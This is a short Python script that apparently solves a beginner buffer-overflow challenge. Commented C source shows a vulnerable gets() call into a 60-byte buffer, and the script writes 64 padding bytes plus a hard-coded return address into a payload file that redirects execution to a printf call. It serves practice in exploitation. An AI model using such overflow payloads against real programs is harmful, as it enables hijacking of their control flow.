#int main(int argc, char*argv[]){
#    int cookie=0;
#    char buf[60];
#
#    gets(buf);
#
#    if (cookie == 0x000D0A00)
#        printf("YOU WIN!\n");
#
#return 0;
#}

import struct

with open('./03-challenge.win','wb') as win:
	buffer = b'\x00' * 0x40 #64
	printf = struct.pack('<L', 0x0804845a)	
	win.write(buffer + printf)